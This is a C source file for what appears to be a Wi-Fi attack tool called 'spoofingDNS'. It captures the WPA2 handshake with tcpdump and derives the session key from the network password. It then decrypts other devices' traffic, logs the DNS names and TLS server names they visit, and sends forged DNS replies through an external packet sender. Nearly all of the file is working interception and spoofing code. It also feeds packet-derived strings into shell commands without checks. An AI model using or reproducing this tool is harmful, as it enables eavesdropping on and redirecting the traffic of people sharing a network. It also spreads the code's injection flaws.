// sniffing libraries
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include<time.h>

#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

#include <malloc.h> 

#include <openssl/hmac.h> 
#include <openssl/evp.h> 
#include <openssl/engine.h> 
#include <openssl/aes.h>
#include <openssl/rand.h> 

#include <openssl/hmac.h>
#include <openssl/evp.h>

#include <ctype.h> // toupper

// Removes spaces from the input string
void removeSpaces(char* input, char spliter) {
    char* tempString = input;
    do {
        while (*tempString == spliter) {
            ++tempString;
        }
    } while (*input++ = *tempString++);
}

// this function converts hex characters into their int equivalent in base 16
int toHexProp(char a)
{
	switch(toupper(a)) {
		case 'A':
			return 10;
		case 'B':
			return 11;
		case 'C':
			return 12;
		case 'D':
			return 13;
		case 'E':
			return 14;
		case 'F':
			return 15;
		default:
			return (a - '\x30');
	}
}


// this function finds the larger value out of 2 hex inputs and returns 0 if the first is largest and 1 else
int max(char* a, char* b) 
{
	int counter = 0;
	int lengthOfA = strlen(a);
	int lengthOfB = strlen(b);
	
	// are they the same length?
	if(lengthOfA > lengthOfB) {
		return 0;
	}
	if(lengthOfB > lengthOfA) {
		return 1;
	}

	// work from most significant bit to least comparing both numbers
	while (counter < lengthOfA)
	{	
		char aChar[5];
		char bChar[5];
		
		memcpy(aChar, a+counter, 2);
		memcpy(bChar, b+counter, 2);
		
		aChar[1] = '\0';
		bChar[1] = '\0';
	
		int aNum = (int)strtol(aChar, NULL, 16);
		int bNum = (int)strtol(bChar, NULL, 16);
		
		if(aNum > bNum) {
			return 0;
		}
		if(bNum > aNum) {
			return 1;
		}
		counter++;
	}
	return 0;
}

// this function calculates the encryption key of the communication
void calculatePtk(char* psk, char* ssid, char* ANonce, char* SNonce, char* apMac, char* staMac, char* ptkFull)
{
	// find the larger mac
	int biggerMac = max(staMac, apMac);
	int biggerNonce = max(SNonce, ANonce);
	
	char concatinationOfMessages[100];
	
	char* constant = "Pairwise key expansion0";
	memcpy(concatinationOfMessages, constant, 23);


	int sizeUsed = 23;
	int variableSize = 0;
	
	// this is used to order the data used by the key generation function
	for(int loopCounter = 0; loopCounter < 4; loopCounter++)
	{	
		if(loopCounter < 2) // we place macs in before the nonces
		{
			variableSize = 12;
		}
		else
		{
			variableSize = 64;
		}
		
		char temp[variableSize];
	
		switch(loopCounter)
		{
			case 0:
				if(biggerMac == 0)
				{
					memcpy(temp, apMac, strlen(apMac));
				}
				else
				{
					memcpy(temp, staMac, strlen(staMac));
				}
				break;
			case 1:
				if(biggerMac == 1)
				{
					memcpy(temp, apMac, strlen(apMac));
				}
				else
				{
					memcpy(temp, staMac, strlen(staMac));
				}
				break;
			case 2:
				if(biggerNonce == 0)
				{
					memcpy(temp, ANonce, strlen(ANonce));
				}
				else
				{
					memcpy(temp, SNonce, strlen(SNonce));
				}
				break;
			case 3:
				if(biggerNonce == 1)
				{
					memcpy(temp, ANonce, strlen(ANonce));
				}
				else
				{
					memcpy(temp, SNonce, strlen(SNonce));
				}
				break;
		}
		
		int counter = 0;
		int tempCounter = 0;
		
		while(strlen(temp) > tempCounter)
		{
			int a = toHexProp(temp[tempCounter + 0]);
			int b = toHexProp(temp[tempCounter + 1]);
			
			int finalNum = (a*16)+b;
		
			char c = (char)finalNum;
			
			concatinationOfMessages[sizeUsed + counter] = c;
			
			tempCounter = tempCounter + 2; 
			counter = counter+1;
		}
		
		sizeUsed = sizeUsed + (variableSize / 2);
	}
	
	// add a counter to the text
	concatinationOfMessages[22] = (char)0;
	
        
        // ---------------------------- calculate PMK -------------------------------------------------
           
        // allocate some memory for the key to be stored in
        unsigned char *pmk = (unsigned char *) malloc(sizeof(unsigned char) * 32);
 	PKCS5_PBKDF2_HMAC_SHA1(psk, strlen(psk), ssid, strlen(ssid), 4096, 32, pmk);
        
        
        // ---------------------------- calculate PTK -------------------------------------------------
      
      	int sizeOfCurrentPtk = 0;
      
      	// allocate some memory for the key to be stored in
      	unsigned char *ptk = (unsigned char *) malloc(sizeof(unsigned char) * 20);
      
        // initialize the hashing function
      	const EVP_MD *sha = EVP_sha1();
      
      	unsigned int len = 20;
      
      	for(int hmacRoundCounter = 0; hmacRoundCounter < 4; hmacRoundCounter++)
      	{
      		// incroment counter
		concatinationOfMessages[99] = (char)hmacRoundCounter;
		
		
		HMAC(sha, pmk, 32, concatinationOfMessages, 100, ptk, &len);
		
		int numberOfCharsToReadIn = 20;
		if(hmacRoundCounter == 3) // on the last round of hmac
		{
			numberOfCharsToReadIn = 4;
		}
		
		for(int y = 0; y < numberOfCharsToReadIn; y++)
		{
			ptkFull[(hmacRoundCounter*20) + y] = ptk[y];
		}
		
		
		
      		
      	}
      	
      	// free memory used by the key functions
      	free(pmk);
	free(ptk);	
}

// this function checks whether the packet recieved is a DNS query and then sends out our spoofed responce
int dnsDetection(char* commandString, char* key, char* apMac, char* deviceMac, char* interface)
{
	// run the decryption script on the packet
	FILE *datastream;
	char buffer[2000];
	  
	datastream = popen(commandString, "r");

	if (datastream == NULL) {
		printf("Failed to run capture\n");
	        exit(1);
	}
	
	fgets(buffer, sizeof(buffer), datastream);
	
	
	// check the port used by the packet is DNS
	if(buffer[60] == '0' && buffer[61] == '0' && buffer[62] == '3' && buffer[63] == '5')
	{
		printf("DNS detected\n");
		
		printf("Site: ");
		int counter = 98;
		int a = toHexProp(buffer[counter]);
		int b = toHexProp(buffer[counter+1]);
		
		while((a*16)+b != 0)
		{
			int finalNum = (a*16)+b;
		
			char c = (char)finalNum;
			
			
			if(a == 0 || b == 0)
			{
				printf(".");
			}
			else
			{
				printf("%c", c);
			}
			
			counter = counter + 2;
			a = toHexProp(buffer[counter]);
			b = toHexProp(buffer[counter+1]);
		}
		printf("\n");
		

		
		char transactionId[5];
		char destinationPort[5];
		char destinationIP[9];
		char sourceIP[9];
		char macTimestamp[17];
		
		// read in the nessasary values
		snprintf(transactionId, sizeof(transactionId), "%c%c%c%c", buffer[72], buffer[73], buffer[74], buffer[75]);
		snprintf(destinationPort, sizeof(destinationPort), "%c%c%c%c", buffer[56], buffer[57], buffer[58], buffer[59]);
		snprintf(destinationIP, sizeof(destinationIP), "%c%c%c%c%c%c%c%c", buffer[48], buffer[49], buffer[50], buffer[51], buffer[52], buffer[53], buffer[54], buffer[55]);
		snprintf(sourceIP, sizeof(sourceIP), "%c%c%c%c%c%c%c%c", buffer[40], buffer[41], buffer[42], buffer[43], buffer[44], buffer[45], buffer[46], buffer[47]);
		
		// write a command for the packet sending script
		char commandString[2001];
		snprintf(commandString, sizeof(commandString), "./packetSender %s %s %s %s %s 0035 %s %s %s", interface, deviceMac, apMac, destinationIP, sourceIP, destinationPort, transactionId, key); 
		
		// send 3 spoofed packets
		system(commandString);
		system(commandString);
		system(commandString);
	}
	else
	{
		// if the port numbers refer to TLS
		if(buffer[60] == '0' && buffer[61] == '1' && buffer[62] == 'b' && buffer[63] == 'b')
		{
			printf("TLS detected\n");
		
			printf("SNI: ");
			int counter = 0;
			int a = toHexProp(buffer[counter]);
			int b = toHexProp(buffer[counter+1]);
			
			while(counter < 500)
			{
				int finalNum = (a*16)+b;
			
				char c = (char)finalNum;
				
				
				if(a == 0 || b == 0)
				{
					printf(".");
				}
				else
				{
					printf("%c", c);
				}
				
				counter = counter + 2;
				a = toHexProp(buffer[counter]);
				b = toHexProp(buffer[counter+1]);
			}
			printf("\n");
		
		}
		else
		{
			// if not TLS or DNS print out the decrypted packet
			printf("Decrypted Packet: %s\n", buffer);
		}
	}
	
	return 0;
}


// Collects data from the network
int main(int argc, char *argv[])
{
  char apMac[13];
  char staMac[13];
  
  char apMacSeperated[18];
  char staMacSeperated[18];
  
  char Current_apMac[18];
  char Current_staMac[18];
  char ANonce[65] = "";
  char SNonce[65] = "";
  
  int start_time;
  
  // allocate some memory for the keys to be stored in
  unsigned char *ptk = (unsigned char *) malloc(sizeof(unsigned char) * 64);
  unsigned char *ptkShortened = (unsigned char *) malloc(sizeof(unsigned char) * 16);
  
  // current mode the system is in
  int searching = -1;

  FILE *datastream;
  char buffer[2000];
  
  
  // start reading in packets on interface specified
  if(argc < 4)
  {
  	printf("Usage: ./spoofingDNS interface network_name network_password");
  	return 0;
  }
  
  // details of the network
  char* psk    = argv[3];
  char* ssid   = argv[2];
  
  char sniffingCommand[50];
  
  // print in hex form and save to file "test" for testing purposes 
  snprintf(sniffingCommand, sizeof(sniffingCommand), "tcpdump -i %s -x -w test -en --print", argv[1]); 
   
  datastream = popen(sniffingCommand, "r");
  

  if (datastream == NULL) {
      printf("Failed to run capture\n");
      exit(1);
  }
  
  // while there is more packet information to read
  while ((fgets(buffer, sizeof(buffer), datastream) != NULL)) {

    if(searching == -1)
    {
    	  system("clear");
    	  searching = 0;
    }

    if(searching == 0)
    {
	    // if the packet is EAPOL traffic
	    if(strstr(buffer, "EAPOL key (3)") != NULL) {
	    
	       	char * partOfHeader = strtok(buffer, " ");
	       	char * lastPartOfHeader = "";
	       	
	       	// get the last part of the tcpdump packet header (size of the packet)
	       	while( partOfHeader != NULL ) {
	       	        // gather the macs
	       		if(strstr(partOfHeader, "BSSID") != NULL)
	       		{
	       			memcpy(Current_apMac, &partOfHeader[6], 17);
	       			Current_apMac[17] = '\0';
	      		}
	      		else if(strstr(partOfHeader, "SA") != NULL)
	      		{
	      			if(memcmp(&partOfHeader[3], Current_apMac, 16) != 0)
				{
		      			memcpy(Current_staMac, &partOfHeader[3], 17);
		       			Current_staMac[17] = '\0';
	       			}
	      		}
	      		else if(strstr(partOfHeader, "DA") != NULL)
	      		{
	      			if(memcmp(&partOfHeader[3], Current_apMac, 16) != 0)
				{
		      			memcpy(Current_staMac, &partOfHeader[3], 17);
		       			Current_staMac[17] = '\0';
	       			}
	      		}
	      		lastPartOfHeader = partOfHeader;
	      		partOfHeader = strtok(NULL, " ");
	    	}
	    	
	    	if(strlen(apMac) == 0)
	    	{
	    	        // choose the macs currently stored
	    	        
	    		memcpy(apMacSeperated, Current_apMac, 17);
	    		apMacSeperated[17] = '\0';
	    		
	    		memcpy(staMacSeperated, Current_staMac, 17);
	    		staMacSeperated[17] = '\0';	    		
	    		
	    		removeSpaces(Current_apMac, ':');
	    		removeSpaces(Current_staMac, ':');
	    		
	    		memcpy(apMac, Current_apMac, 12);
	       		apMac[12] = '\0';
	       		memcpy(staMac, Current_staMac, 12);
	       		staMac[12] = '\0';
	       	
	       		start_time = time(NULL);
	    	}
	    	
	    	// reading a packet
	    	if(strcmp(staMac, Current_staMac) == 0 || strcmp(staMac, Current_apMac) == 0 || strcmp(apMac, Current_staMac))
	    	{
	    		// has too much time elapsed
	    		if( (time(NULL) - start_time) > 3)
	    		{
	    			apMac[0] = '\0'; // reset 
	    		}
	    	
		    	// convert size to a integer
		    	int sizeCounter = atoi(lastPartOfHeader);
		    	int size = sizeCounter;
		    	
		    	// add small extra bit of size to capture data that has text wrapped
		    	sizeCounter = sizeCounter + 16;
		    	
		    	// each line contains 16 chars
		    	
		    	// the text output from tcpdump requires some post-processing to get the raw hex I need
		    	char finalHex[2000] = "";
		    	
		    	// while in the EAPOL packet
		    	while(sizeCounter >= 10) 
		    	{
		    	        // get next line
		    		fgets(buffer, sizeof(buffer), datastream);
		    		
		    		removeSpaces(buffer, ' ');
		    		
		    		// there is a 8 char formatting put on the hex, this removes it
		    		strcat(finalHex, buffer + 8); 
		    		
		    		finalHex[strlen(finalHex) - 1] = '\0';
		    		
		    		sizeCounter = sizeCounter - 16;
		    	}
		    	
			
			char messageNumber[5];
			memcpy( messageNumber, &finalHex[10], 4 );
			messageNumber[4] = '\0';
			
			
			// which message have we captured?
			if(strcmp(messageNumber, "008a") == 0) {
				printf("Captured handshake message 1\n");
				memcpy( ANonce, &finalHex[34], 64 );
				ANonce[64] = '\0';
			}
			else if(strcmp(messageNumber, "010a") == 0) {
				printf("Captured handshake message 2\n");
				memcpy( SNonce, &finalHex[34], 64 );
				SNonce[64] = '\0';
				
				
				// Swap MACS
				char tempMac[13];
				memcpy( tempMac, apMac, 12);
				tempMac[12] = '\0';
				memcpy( apMac, staMac, 12);
				apMac[12] = '\0';
				memcpy( staMac, tempMac, 12);
				staMac[12] = '\0';
				
				 
			}
			else if(strcmp(messageNumber, "13ca") == 0) {
				printf("Captured handshake message 3\n");
				memcpy( ANonce, &finalHex[34], 64 );
				ANonce[64] = '\0';
			}

			// if we have both nonces caluclate the key 
			if(strcmp(ANonce, "") != 0 && strcmp(SNonce, "") != 0)
			{
				searching = 1;
				printf("Access point MAC : %s\n", apMac);
	       			printf("Station MAC      : %s\n", staMac);
				
				
				printf("PTK              : ");
	
			    	calculatePtk(psk, ssid, &ANonce[0], &SNonce[0], &apMac[0], &staMac[0], ptk);
			    	
			    	for(int x = 0; x < 64; x++)
			      	{
					if((x > 31) && (x < 48)) {
						ptkShortened[x - 32] = ptk[x];
					}
				}
				
				// find the temporal key in the PTK
				for(int i = 0; i < 16; i++)
			    	{
			    		printf("%02x", ptkShortened[i]);
			    	}
			    	
			    	printf("\n");
			
			}
		}
		

	}

     }
     
     // if we have the key, decrypt the traffic
     if(searching == 1)
     {  

        // is the data encrypted?
     	if(strstr(buffer, apMacSeperated) != NULL && strstr(buffer, staMacSeperated) != NULL && strstr(buffer, "Data IV") != NULL && strstr(buffer, "QoS") != NULL)
     	{
     		char IV[12] = "";
     		
     		char textPtk[33];
     		char commandString[2001];
     		
     		unsigned int ptkShortenedFormatted[17];
     		
     		
     		
     		char * partOfHeader = strtok(buffer, ":");
	       	char * lastPartOfHeader = "S";
	       	
	       	// find and store the IV
	       	while( partOfHeader != NULL ) {
	       		if(strstr(lastPartOfHeader, "Data IV") != NULL)
	       		{
	       			char *temp = strtok(partOfHeader, "P");
	       			
	       			int startPos = 10000;
	       			
	       			for(int y = 0; y < strlen(temp); y++)
	       			{
	       				if(temp[y] != ' ' && startPos == 10000)
	       				{
	       					startPos = y;
	       				}
	       			}
	       			
	       			
	       			memcpy(IV, (&temp[startPos]), 5);
	       			
	       			
	       		}
	       		
	      		lastPartOfHeader = partOfHeader;
	      		partOfHeader = strtok(NULL, ":");
	    	}
	    	
	    	// reformat the ptk
		for(int x = 0; x < 16; x++)
	      	{
			ptkShortenedFormatted[x] = (unsigned int)(ptkShortened[x] & 0xFF);
		}
		
		snprintf(textPtk, sizeof(textPtk), "%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X", ptkShortenedFormatted[0], ptkShortenedFormatted[1], ptkShortenedFormatted[2], ptkShortenedFormatted[3], ptkShortenedFormatted[4], ptkShortenedFormatted[5], ptkShortenedFormatted[6], ptkShortenedFormatted[7], ptkShortenedFormatted[8], ptkShortenedFormatted[9], ptkShortenedFormatted[10], ptkShortenedFormatted[11], ptkShortenedFormatted[12], ptkShortenedFormatted[13], ptkShortenedFormatted[14], ptkShortenedFormatted[15], ptkShortenedFormatted[16]);
		
		
		// read in the rest of the packet
     		fgets(buffer, sizeof(buffer), datastream);
     		char finalHex[5000] = "";
     		
     		while(buffer[0] == '\t')
     		{
	    		removeSpaces(buffer, ' ');
	    		
	    		// there is a 8 char formatting put on the hex, this removes it
	    		strcat(finalHex, buffer + 8); 
	    		
	    		finalHex[strlen(finalHex) - 1] = '\0';
	    		
	    		fgets(buffer, sizeof(buffer), datastream);
	    		
     		}
     		

     		
     		// create a command for the python decrypter script
     		snprintf(commandString, sizeof(commandString), "python aesDecrypter.py %s %s %s %s", textPtk, apMac, IV, finalHex+16); 

     		// is this DNS or TLS?
     		dnsDetection(commandString, textPtk, apMac, staMac, argv[1]);
     		
     		
     		fflush(stdout);
     		
     		
     		
     	}
     }
    
  }
  
  // free the allocated data
  free(ptk);
  
  // stop collecting packets
  pclose(datastream);
  
  return 0;
}
